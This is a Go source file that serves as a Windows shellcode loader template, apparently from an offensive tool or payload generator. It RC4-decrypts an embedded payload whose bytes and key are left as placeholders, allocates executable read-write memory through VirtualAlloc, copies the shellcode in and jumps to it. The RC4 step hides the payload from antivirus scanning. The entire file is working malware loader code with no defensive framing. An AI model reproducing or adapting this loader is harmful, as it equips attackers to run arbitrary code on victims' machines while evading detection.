package main

import (
	"crypto/rc4"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

const DECKEY = ":KEY:"

func main() {

	shell := []byte{SHELLCODEHERE}
	decryptedshellcode := decryptshellcode([]byte(shell))
	executeshell(decryptedshellcode)
}

func decryptshellcode(shellcodetodecrypt []byte) []byte {
	key := []byte(DECKEY)
	ciphertext := shellcodetodecrypt
	decrypted := make([]byte, len(ciphertext))
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error)
	}

	c.XORKeyStream(decrypted, ciphertext)

	return decrypted
}

func executeshell(shellcode []byte) {

	k32 := syscall.MustLoadDLL("kernel32.dll")

	valloc := k32.MustFindProc("VirtualAlloc")

	//make space for shellcode
	addr, _, _ := valloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	ptrtoaddressallocated := (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range shellcode {
		ptrtoaddressallocated[i] = value

	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
